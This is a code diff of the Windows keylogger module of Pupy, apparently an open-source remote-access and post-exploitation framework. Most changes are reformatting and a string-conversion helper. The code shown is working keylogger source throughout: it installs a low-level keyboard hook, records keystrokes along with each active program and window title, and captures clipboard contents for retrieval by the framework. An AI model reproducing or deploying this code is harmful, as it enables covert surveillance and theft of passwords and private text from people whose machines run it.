@@ -1,22 +1,45 @@
+# --------------------------------------------------------------
+# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
+# All rights reserved.
+#
+# Redistribution and use in source and binary forms, with or
+# without modification, are permitted provided that the following
+# conditions are met:
+#
+# 1. Redistributions of source code must retain the above copyright
+# notice, this list of conditions and the following disclaimer.
+#
+# 2. Redistributions in binary form must reproduce the above
+# copyright notice, this list of conditions and the following
+# disclaimer in the documentation and/or other materials provided
+# with the distribution.
+#
+# 3. Neither the name of the copyright holder nor the names of its
+# contributors may be used to endorse or promote products derived
+# from this software without specific prior written permission.
+#
+# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND
+# CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
+# INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
+# MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR
+# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
+# SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
+# NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
+# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+# HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
+# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
+# OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
+# EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
+# --------------------------------------------------------------
+
 from __future__ import absolute_import
 from __future__ import division
 from __future__ import print_function
 from __future__ import unicode_literals
 
-# --------------------------------------------------------------
-# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
-# All rights reserved.
-#
-# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
-#
-# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
-#
-# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
-#
-# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
-#
-# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
-# --------------------------------------------------------------
+import pupy
+import sys
 
 import datetime
 import string
@@ -32,8 +55,7 @@ from .hookfuncs import (
     ToUnicodeEx, ToAsciiEx, get_current_process, get_clipboard
 )
 
-import pupy
-import sys
+from network.lib.convcompat import as_unicode_string
 
 if sys.version_info.major > 2:
     unicode = str
@@ -70,7 +92,6 @@ UNPRINTABLE = {
     0x7B: 'F12'
 }
 
-#some windows function defines :
 
 def keylogger_start(event_id=None):
     if pupy.manager.active(KeyLogger):
@@ -83,16 +104,19 @@ def keylogger_start(event_id=None):
 
     return True
 
+
 def keylogger_dump():
     keylogger = pupy.manager.get(KeyLogger)
     if keylogger:
         return keylogger.results
+
 
 def keylogger_stop():
     keylogger = pupy.manager.get(KeyLogger)
     if keylogger:
         pupy.manager.stop(KeyLogger)
         return keylogger.results
+
 
 def is_pressed(*keys):
     return any(
@@ -110,11 +134,10 @@ class KeyLogger(pupy.Task):
         self.last_clipboard = ''
         self.hook_proc_ptr = HOOKPROC(self.hook_proc)
 
-    def append(self, k):
-        if isinstance(k, bytes):
-            super(KeyLogger, self).append(k.decode('utf-8'))
-        else:
-            super(KeyLogger, self).append(k)
+    def append(self, data):
+        super(KeyLogger, self).append(
+            as_unicode_string(data)
+        )
 
     def task(self):
         if self.hooked:
@@ -138,7 +161,11 @@ class KeyLogger(pupy.Task):
                 try:
                     GetMessageW(msgptr, None, 0, 0)
                 except Exception as e:
-                    raise ValueError('Shit: {} / {} / {} / {}'.format(msg, msgptr, GetMessageW, e))
+                    raise ValueError(
+                        'Shit: {} / {} / {} / {}'.format(
+                            msg, msgptr, GetMessageW, e
+                        )
+                    )
 
         finally:
             if timer:
@@ -153,7 +180,8 @@ class KeyLogger(pupy.Task):
         modhwd = GetModuleHandleW(None)
 
         self.hooked = SetWindowsHookEx(
-            WH_KEYBOARD_LL, self.hook_proc_ptr, modhwd, 0)
+            WH_KEYBOARD_LL, self.hook_proc_ptr, modhwd, 0
+        )
 
         if not self.hooked:
             raise WinError()
@@ -216,16 +244,18 @@ class KeyLogger(pupy.Task):
                 modifiers.append('SHIFT')
 
         if kbdllhookstruct.vkCode in UNPRINTABLE:
-            if not (kbdllhookstruct.vkCode in (VK_LWIN, VK_RWIN) and 'WIN' in modifiers):
+            if not (kbdllhookstruct.vkCode in (
+                    VK_LWIN, VK_RWIN) and 'WIN' in modifiers):
                 key = UNPRINTABLE[kbdllhookstruct.vkCode]
                 if not modifiers:
                     key = '[' + key + ']'
 
-        elif kbdllhookstruct.vkCode >= VK_LSHIFT and kbdllhookstruct.vkCode <= VK_RMENU:
+        elif kbdllhookstruct.vkCode >= VK_LSHIFT and \
+                kbdllhookstruct.vkCode <= VK_RMENU:
             key = ''
 
         else:
-            #https://msdn.microsoft.com/en-us/library/windows/desktop/ms646322(v=vs.85).aspx
+            # https://msdn.microsoft.com/en-us/library/windows/desktop/ms646322(v=vs.85).aspx
             r = ToUnicodeEx(
                 kbdllhookstruct.vkCode,
                 kbdllhookstruct.scanCode,
@@ -246,7 +276,7 @@ class KeyLogger(pupy.Task):
                     0
                 )
 
-            if r == 0: #nothing written to the buffer
+            if r == 0:  # nothing written to the buffer
                 key = chr(kbdllhookstruct.vkCode)
                 if key not in string.printable:
                     key = '{:02X}'.format(
@@ -266,14 +296,17 @@ class KeyLogger(pupy.Task):
         except Exception:
             pass
 
-        if self.last_windows!=(exe, win_title):
+        if self.last_windows != (exe, win_title):
             self.append(
-                u'\n{}: {} {}\n'.format(
+                '\n{}: {} {}\n'.format(
                     datetime.datetime.now(),
-                    exe, win_title))
-            self.last_windows=(exe, win_title)
+                    exe, win_title
+                )
+            )
 
-        paste=''
+            self.last_windows = (exe, win_title)
+
+        paste = ''
 
         try:
             paste = get_clipboard()
@@ -282,9 +315,13 @@ class KeyLogger(pupy.Task):
 
         if paste and paste != self.last_clipboard:
             try:
-                self.append(u'\n<clipboard>{}</clipboard>\n'.format(paste.strip()))
+                self.append(
+                    '\n<clipboard>{}</clipboard>\n'.format(paste.strip())
+                )
             except:
-                self.append(u'\n<clipboard>{}</clipboard>\n'.format(repr(paste)[2:-1]))
+                self.append(
+                    '\n<clipboard>{}</clipboard>\n'.format(repr(paste)[2:-1])
+                )
 
             self.last_clipboard = paste
 
